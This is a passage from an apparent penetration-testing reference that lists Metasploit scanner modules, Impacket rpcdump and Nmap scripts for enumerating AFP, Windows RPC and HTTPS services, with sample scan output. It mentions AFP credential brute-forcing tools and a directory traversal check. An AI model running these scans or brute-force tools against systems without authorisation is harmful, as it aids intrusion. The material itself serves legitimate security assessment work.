<h2>AFP - Apple Filing Protocol - Port 548<a class="headerlink" href="#afp-apple-filing-protocol-port-548" title="Permalink to this headline">¶</a></h2>
<p>AFP is a proprietary network protocol that offers file services for MAC OS X and original MAC OS.</p>
<div class="section" id="id32">
<h3>Metasploit<a class="headerlink" href="#id32" title="Permalink to this headline">¶</a></h3>
<p>Two auxiliary modules available.</p>
<div class="section" id="apple-filing-protocol-info-enumerator">
<h4>Apple Filing Protocol Info Enumerator<a class="headerlink" href="#apple-filing-protocol-info-enumerator" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">afp</span><span class="o">/</span><span class="n">afp_server_info</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">548</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">S</span> <span class="n">AFP</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">Scanning</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span><span class="p">:</span><span class="mi">548</span> <span class="n">AFP</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span> <span class="n">Server</span> <span class="n">Name</span><span class="p">:</span> <span class="n">example</span><span class="o">-</span><span class="n">airport</span><span class="o">-</span><span class="n">time</span><span class="o">-</span><span class="n">capsule</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>  <span class="n">Server</span> <span class="n">Flags</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="n">Super</span> <span class="n">Client</span><span class="p">:</span> <span class="n">true</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="n">UUIDs</span><span class="p">:</span> <span class="n">true</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="n">UTF8</span> <span class="n">Server</span> <span class="n">Name</span><span class="p">:</span> <span class="n">true</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="n">Open</span> <span class="n">Directory</span><span class="p">:</span> <span class="n">true</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="n">Reconnect</span><span class="p">:</span> <span class="n">true</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="n">Server</span> <span class="n">Notifications</span><span class="p">:</span> <span class="n">true</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="n">TCP</span><span class="o">/</span><span class="n">IP</span><span class="p">:</span> <span class="n">true</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="n">Server</span> <span class="n">Signature</span><span class="p">:</span> <span class="n">true</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="n">Server</span> <span class="n">Messages</span><span class="p">:</span> <span class="n">true</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="n">Password</span> <span class="n">Saving</span> <span class="n">Prohibited</span><span class="p">:</span> <span class="n">false</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="n">Password</span> <span class="n">Changing</span><span class="p">:</span> <span class="n">true</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="n">Copy</span> <span class="n">File</span><span class="p">:</span> <span class="n">true</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>  <span class="n">Machine</span> <span class="n">Type</span><span class="p">:</span> <span class="n">TimeCapsule8</span><span class="p">,</span><span class="mi">119</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>  <span class="n">AFP</span> <span class="n">Versions</span><span class="p">:</span> <span class="n">AFP3</span><span class="o">.</span><span class="mi">3</span><span class="p">,</span> <span class="n">AFP3</span><span class="o">.</span><span class="mi">2</span><span class="p">,</span> <span class="n">AFP3</span><span class="o">.</span><span class="mi">1</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>  <span class="n">UAMs</span><span class="p">:</span> <span class="n">DHCAST128</span><span class="p">,</span> <span class="n">DHX2</span><span class="p">,</span> <span class="n">SRP</span><span class="p">,</span> <span class="n">Recon1</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>  <span class="n">Server</span> <span class="n">Signature</span><span class="p">:</span> <span class="mi">4338364</span><span class="n">c4e355635463948350069672d</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>  <span class="n">Server</span> <span class="n">Network</span> <span class="n">Address</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="mf">10.11</span><span class="o">.</span><span class="mf">4.76</span><span class="p">:</span><span class="mi">548</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="p">[</span><span class="n">fe80</span><span class="p">:</span><span class="mi">0009</span><span class="p">:</span><span class="mi">0000</span><span class="p">:</span><span class="mi">0000</span><span class="p">:</span><span class="mi">9272</span><span class="p">:</span><span class="mi">40</span><span class="n">ff</span><span class="p">:</span><span class="n">fe0b</span><span class="p">:</span><span class="mi">99</span><span class="n">b7</span><span class="p">]:</span><span class="mi">548</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>     <span class="o">*</span>  <span class="mf">10.11</span><span class="o">.</span><span class="mf">4.76</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AFP</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">548</span>   <span class="n">UTF8</span> <span class="n">Server</span> <span class="n">Name</span><span class="p">:</span> <span class="n">Example</span><span class="s1">&#39;s AirPort Time Capsule</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">1</span> <span class="n">of</span> <span class="mi">1</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
</pre></div>
</div>
</div>
<div class="section" id="apple-filing-protocol-login-utility">
<h4>Apple Filing Protocol Login Utility<a class="headerlink" href="#apple-filing-protocol-login-utility" title="Permalink to this headline">¶</a></h4>
<p>Attempts to bruteforce authentication credentials for AFP.</p>
</div>
</div>
<div class="section" id="id33">
<h3>Nmap<a class="headerlink" href="#id33" title="Permalink to this headline">¶</a></h3>
<div class="section" id="afp-serverinfo">
<h4>afp-serverinfo<a class="headerlink" href="#afp-serverinfo" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/afp-serverinfo.html">afp-serverinfo.nse</a> : Shows AFP server information.</p>
</div>
<div class="section" id="afp-brute">
<h4>afp-brute<a class="headerlink" href="#afp-brute" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/afp-brute.html">afp-brute.nse</a> : Performs password guessing against Apple Filing Protocol (AFP).</p>
</div>
<div class="section" id="afp-ls">
<h4>afp-ls<a class="headerlink" href="#afp-ls" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/afp-ls.html">afp-ls.nse</a> : Attempts to get useful information about files from AFP volumes. The output is intended to resemble the output of ls.</p>
</div>
<div class="section" id="afp-showmount">
<h4>afp-showmount<a class="headerlink" href="#afp-showmount" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/afp-showmount.html">afp-showmount.nse</a> : Shows AFP shares and ACLs.</p>
</div>
<div class="section" id="afp-path-vuln">
<h4>afp-path-vuln<a class="headerlink" href="#afp-path-vuln" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/afp-path-vuln.html">afp-path-vuln.nse</a> : Detects the Mac OS X AFP directory traversal vulnerability, CVE-2010-0533.</p>
</div>
</div>
</div>
<div class="section" id="microsoft-windows-rpc-services-port-135-and-microsoft-rpc-services-over-http-port-593">
<h2>Microsoft Windows RPC Services | Port 135 and Microsoft RPC Services over HTTP | Port 593<a class="headerlink" href="#microsoft-windows-rpc-services-port-135-and-microsoft-rpc-services-over-http-port-593" title="Permalink to this headline">¶</a></h2>
<p>Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593.</p>
<div class="section" id="id34">
<h3>Metasploit<a class="headerlink" href="#id34" title="Permalink to this headline">¶</a></h3>
<div class="section" id="endpoint-mapper-service-discovery">
<h4>Endpoint Mapper Service Discovery<a class="headerlink" href="#endpoint-mapper-service-discovery" title="Permalink to this headline">¶</a></h4>
<p>Module can be used to obtain information from the Endpoint Mapper service</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">dcerpc</span><span class="o">/</span><span class="n">endpoint_mapper</span>
</pre></div>
</div>
</div>
<div class="section" id="hidden-dcerpc-service-discovery">
<h4>Hidden DCERPC Service Discovery<a class="headerlink" href="#hidden-dcerpc-service-discovery" title="Permalink to this headline">¶</a></h4>
<p>Module will query the endpoint mapper and make a list of all ncacn_tcp RPC services. It will then connect to each of these services and use the management API to list all other RPC services accessible on this port. Any RPC service found attached to a TCP port, but not listed in the endpoint mapper, will be displayed and analyzed to see whether anonymous access is permitted.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">dcerpc</span><span class="o">/</span><span class="n">hidden</span>
</pre></div>
</div>
</div>
<div class="section" id="remote-management-interface-discovery">
<h4>Remote Management Interface Discovery<a class="headerlink" href="#remote-management-interface-discovery" title="Permalink to this headline">¶</a></h4>
<p>Module can be used to obtain information from the Remote Management Interface DCERPC service.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">dcerpc</span><span class="o">/</span><span class="n">management</span>
</pre></div>
</div>
</div>
<div class="section" id="dcerpc-tcp-service-auditor">
<h4>DCERPC TCP Service Auditor<a class="headerlink" href="#dcerpc-tcp-service-auditor" title="Permalink to this headline">¶</a></h4>
<p>Determine what DCERPC services are accessible over a TCP port.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">dcerpc</span><span class="o">/</span><span class="n">tcp_dcerpc_auditor</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id35">
<h3>Other<a class="headerlink" href="#id35" title="Permalink to this headline">¶</a></h3>
<p>We can use <strong>rpcdump</strong> from <strong>Impacket</strong> to dump the RPC information. This tool can communicate over Port 135,139 and 445. The rpcdump tool from rpctools can also extract information from Port 593.</p>
<div class="section" id="rpcdump">
<h4>rpcdump<a class="headerlink" href="#rpcdump" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mf">9.14</span><span class="o">-</span><span class="n">dev</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2002</span><span class="o">-</span><span class="mi">2015</span> <span class="n">Core</span> <span class="n">Security</span> <span class="n">Technologies</span>

<span class="n">usage</span><span class="p">:</span> <span class="n">rpcdump</span><span class="o">.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">debug</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">hashes</span> <span class="n">LMHASH</span><span class="p">:</span><span class="n">NTHASH</span><span class="p">]</span>
                  <span class="n">target</span> <span class="p">[{</span><span class="mi">445</span><span class="o">/</span><span class="n">SMB</span><span class="p">,</span><span class="mi">135</span><span class="o">/</span><span class="n">TCP</span><span class="p">,</span><span class="mi">139</span><span class="o">/</span><span class="n">SMB</span><span class="p">}]</span>

<span class="n">Dumps</span> <span class="n">the</span> <span class="n">remote</span> <span class="n">RPC</span> <span class="n">endpoints</span> <span class="n">information</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rpcdump</span><span class="o">.</span><span class="n">py</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mf">9.14</span><span class="o">-</span><span class="n">dev</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2002</span><span class="o">-</span><span class="mi">2015</span> <span class="n">Core</span> <span class="n">Security</span> <span class="n">Technologies</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Retrieving</span> <span class="n">endpoint</span> <span class="nb">list</span> <span class="kn">from</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">protocol</span> <span class="mi">135</span><span class="o">/</span><span class="n">TCP</span><span class="o">...</span>
<span class="n">Protocol</span><span class="p">:</span> <span class="n">N</span><span class="o">/</span><span class="n">A</span>
<span class="n">Provider</span><span class="p">:</span> <span class="n">iphlpsvc</span><span class="o">.</span><span class="n">dll</span>
<span class="n">UUID</span>    <span class="p">:</span> <span class="mi">552</span><span class="n">D076A</span><span class="o">-</span><span class="n">CB29</span><span class="o">-</span><span class="mf">4E44</span><span class="o">-</span><span class="mi">8</span><span class="n">B6A</span><span class="o">-</span><span class="n">D15E59E2C0AF</span> <span class="n">v1</span><span class="o">.</span><span class="mi">0</span> <span class="n">IP</span> <span class="n">Transition</span> <span class="n">Configuration</span> <span class="n">endpoint</span>
<span class="n">Bindings</span><span class="p">:</span>
          <span class="n">ncacn_np</span><span class="p">:</span>\\<span class="n">ADS</span><span class="p">[</span>\<span class="n">PIPE</span>\<span class="n">srvsvc</span><span class="p">]</span>
          <span class="n">ncacn_ip_tcp</span><span class="p">:</span><span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">[</span><span class="mi">49154</span><span class="p">]</span>
          <span class="n">ncacn_np</span><span class="p">:</span>\\<span class="n">ADS</span><span class="p">[</span>\<span class="n">PIPE</span>\<span class="n">atsvc</span><span class="p">]</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">senssvc</span><span class="p">]</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">OLEEC91239AB64E4F319A44EB95228B</span><span class="p">]</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">IUserProfile2</span><span class="p">]</span>

<span class="n">Protocol</span><span class="p">:</span> <span class="n">N</span><span class="o">/</span><span class="n">A</span>
<span class="n">Provider</span><span class="p">:</span> <span class="n">schedsvc</span><span class="o">.</span><span class="n">dll</span>
<span class="n">UUID</span>    <span class="p">:</span> <span class="mi">0</span><span class="n">A74EF1C</span><span class="o">-</span><span class="mi">41</span><span class="n">A4</span><span class="o">-</span><span class="mf">4E06</span><span class="o">-</span><span class="mi">83</span><span class="n">AE</span><span class="o">-</span><span class="n">DC74FB1CDD53</span> <span class="n">v1</span><span class="o">.</span><span class="mi">0</span>
<span class="n">Bindings</span><span class="p">:</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">senssvc</span><span class="p">]</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">OLEEC91239AB64E4F319A44EB95228B</span><span class="p">]</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">IUserProfile2</span><span class="p">]</span>

<span class="n">Protocol</span><span class="p">:</span> <span class="n">N</span><span class="o">/</span><span class="n">A</span>
<span class="n">Provider</span><span class="p">:</span> <span class="n">nsisvc</span><span class="o">.</span><span class="n">dll</span>
<span class="n">UUID</span>    <span class="p">:</span> <span class="mi">7</span><span class="n">EA70BCF</span><span class="o">-</span><span class="mi">48</span><span class="n">AF</span><span class="o">-</span><span class="mi">4</span><span class="n">F6A</span><span class="o">-</span><span class="mi">8968</span><span class="o">-</span><span class="mi">6</span><span class="n">A440754D5FA</span> <span class="n">v1</span><span class="o">.</span><span class="mi">0</span> <span class="n">NSI</span> <span class="n">server</span> <span class="n">endpoint</span>
<span class="n">Bindings</span><span class="p">:</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">LRPC</span><span class="o">-</span><span class="mi">37912</span><span class="n">a0de47813b4b3</span><span class="p">]</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">OLE6ECE1F6A513142EC99562256F849</span><span class="p">]</span>

<span class="n">Protocol</span><span class="p">:</span> <span class="p">[</span><span class="n">MS</span><span class="o">-</span><span class="n">CMPO</span><span class="p">]:</span> <span class="n">MSDTC</span> <span class="n">Connection</span> <span class="n">Manager</span><span class="p">:</span>
<span class="n">Provider</span><span class="p">:</span> <span class="n">msdtcprx</span><span class="o">.</span><span class="n">dll</span>
<span class="n">UUID</span>    <span class="p">:</span> <span class="mi">906</span><span class="n">B0CE0</span><span class="o">-</span><span class="n">C70B</span><span class="o">-</span><span class="mi">1067</span><span class="o">-</span><span class="n">B317</span><span class="o">-</span><span class="mi">00</span><span class="n">DD010662DA</span> <span class="n">v1</span><span class="o">.</span><span class="mi">0</span>
<span class="n">Bindings</span><span class="p">:</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">LRPC</span><span class="o">-</span><span class="mf">316e773</span><span class="n">cde064c1ede</span><span class="p">]</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">LRPC</span><span class="o">-</span><span class="mf">316e773</span><span class="n">cde064c1ede</span><span class="p">]</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">LRPC</span><span class="o">-</span><span class="mf">316e773</span><span class="n">cde064c1ede</span><span class="p">]</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">LRPC</span><span class="o">-</span><span class="mf">316e773</span><span class="n">cde064c1ede</span><span class="p">]</span>

<span class="n">Protocol</span><span class="p">:</span> <span class="p">[</span><span class="n">MS</span><span class="o">-</span><span class="n">PAN</span><span class="p">]:</span> <span class="n">Print</span> <span class="n">System</span> <span class="n">Asynchronous</span> <span class="n">Notification</span> <span class="n">Protocol</span>
<span class="n">Provider</span><span class="p">:</span> <span class="n">spoolsv</span><span class="o">.</span><span class="n">exe</span>
<span class="n">UUID</span>    <span class="p">:</span> <span class="mi">0</span><span class="n">B6EDBFA</span><span class="o">-</span><span class="mi">4</span><span class="n">A24</span><span class="o">-</span><span class="mi">4</span><span class="n">FC6</span><span class="o">-</span><span class="mi">8</span><span class="n">A23</span><span class="o">-</span><span class="mi">942</span><span class="n">B1ECA65D1</span> <span class="n">v1</span><span class="o">.</span><span class="mi">0</span> <span class="n">Spooler</span> <span class="n">function</span> <span class="n">endpoint</span>
<span class="n">Bindings</span><span class="p">:</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">spoolss</span><span class="p">]</span>

<span class="n">Protocol</span><span class="p">:</span> <span class="p">[</span><span class="n">MS</span><span class="o">-</span><span class="n">TSCH</span><span class="p">]:</span> <span class="n">Task</span> <span class="n">Scheduler</span> <span class="n">Service</span> <span class="n">Remoting</span> <span class="n">Protocol</span>
<span class="n">Provider</span><span class="p">:</span> <span class="n">taskcomp</span><span class="o">.</span><span class="n">dll</span>

<span class="n">Protocol</span><span class="p">:</span> <span class="n">N</span><span class="o">/</span><span class="n">A</span>
<span class="n">Provider</span><span class="p">:</span> <span class="n">MPSSVC</span><span class="o">.</span><span class="n">dll</span>
<span class="n">UUID</span>    <span class="p">:</span> <span class="mi">7</span><span class="n">F9D11BF</span><span class="o">-</span><span class="mi">7</span><span class="n">FB9</span><span class="o">-</span><span class="mi">436</span><span class="n">B</span><span class="o">-</span><span class="n">A812</span><span class="o">-</span><span class="n">B2D50C5D4C03</span> <span class="n">v1</span><span class="o">.</span><span class="mi">0</span> <span class="n">Fw</span> <span class="n">APIs</span>
<span class="n">Bindings</span><span class="p">:</span>
          <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">LRPC</span><span class="o">-</span><span class="mf">5409763072e46</span><span class="n">c4586</span><span class="p">]</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Received</span> <span class="mi">189</span> <span class="n">endpoints</span><span class="o">.</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="https-port-443-and-8443">
<h2>HTTPS - Port 443 and 8443<a class="headerlink" href="#https-port-443-and-8443" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id36">
<h3>Metasploit<a class="headerlink" href="#id36" title="Permalink to this headline">¶</a></h3>
<p>Below modules which we found useful are</p>
<div class="section" id="http-ssl-certificate-information">
<h4>HTTP SSL Certificate Information<a class="headerlink" href="#http-ssl-certificate-information" title="Permalink to this headline">¶</a></h4>
<p>Parses the server SSL certificate to obtain the common name and signature algorithm.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">ssl</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">443</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="n">Subject</span><span class="p">:</span> <span class="o">/</span><span class="n">OU</span><span class="o">=</span><span class="n">Domain</span> <span class="n">Control</span> <span class="n">Validated</span><span class="o">/</span><span class="n">CN</span><span class="o">=</span><span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="n">Issuer</span><span class="p">:</span> <span class="o">/</span><span class="n">C</span><span class="o">=</span><span class="n">US</span><span class="o">/</span><span class="n">ST</span><span class="o">=</span><span class="n">Arizona</span><span class="o">/</span><span class="n">L</span><span class="o">=</span><span class="n">Scottsdale</span><span class="o">/</span><span class="n">O</span><span class="o">=</span><span class="n">GoDaddy</span><span class="o">.</span><span class="n">com</span><span class="p">,</span> <span class="n">Inc</span><span class="o">./</span><span class="n">OU</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">certs</span><span class="o">.</span><span class="n">godaddy</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">repository</span><span class="o">//</span><span class="n">CN</span><span class="o">=</span><span class="n">Go</span> <span class="n">Daddy</span> <span class="n">Secure</span> <span class="n">Certificate</span> <span class="n">Authority</span> <span class="o">-</span> <span class="n">G2</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="n">Signature</span> <span class="n">Alg</span><span class="p">:</span> <span class="n">sha256WithRSAEncryption</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="n">Public</span> <span class="n">Key</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">2048</span> <span class="n">bits</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="n">Not</span> <span class="n">Valid</span> <span class="n">Before</span><span class="p">:</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">12</span> <span class="mi">10</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">38</span> <span class="n">UTC</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="n">Not</span> <span class="n">Valid</span> <span class="n">After</span><span class="p">:</span> <span class="mi">2017</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">38</span> <span class="n">UTC</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="n">Certificate</span> <span class="n">contains</span> <span class="n">no</span> <span class="n">CA</span> <span class="n">Issuers</span> <span class="n">extension</span><span class="o">...</span> <span class="n">possible</span> <span class="bp">self</span> <span class="n">signed</span> <span class="n">certificate</span>
